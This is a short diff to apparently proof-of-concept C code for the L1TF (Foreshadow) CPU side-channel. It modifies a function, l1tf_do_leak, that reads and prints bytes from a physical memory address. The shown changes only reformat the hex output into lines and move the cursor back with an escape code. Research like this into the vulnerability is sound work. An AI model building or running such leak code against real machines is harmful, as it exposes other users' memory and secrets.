@@ -1,7 +1,8 @@
+#include <stdio.h>
 #define _GNU_SOURCE
-#include "l1tf.h"
 #include "constants.h"
 #include "flush_and_reload.h"
+#include "l1tf.h"
 #include "statistics.h"
 #include <asm-generic/errno-base.h>
 #include <bits/time.h>
@@ -316,6 +317,8 @@ void l1tf_do_leak(const uintptr_t phys_addr, const size_t length) {
   size_t start = (phys_addr & 0xfff);
   assert(start + length < 0xfff);
 
+  const int bytes_per_line = 16;
+
   for (int iter = 1; iter <= 10000; ++iter) {
     for (int x = 0; x < 10; ++x) {
       for (size_t i = 0, j = start; j < start + length; j += 1, i += 2) {
@@ -343,8 +346,14 @@ void l1tf_do_leak(const uintptr_t phys_addr, const size_t length) {
 
       size_t result = ((high & 0x0f) << 4) | (low & 0x0f);
       printf("%02lx ", result);
+
+      if (i % (2 * bytes_per_line) == ((2 * bytes_per_line) - 2)) {
+        printf("\n\r");
+      }
     }
-    printf("\r");
+
+    // Restore cursor position
+    printf("\033[%ldA\r", length / bytes_per_line);
   }
 
   free(results);
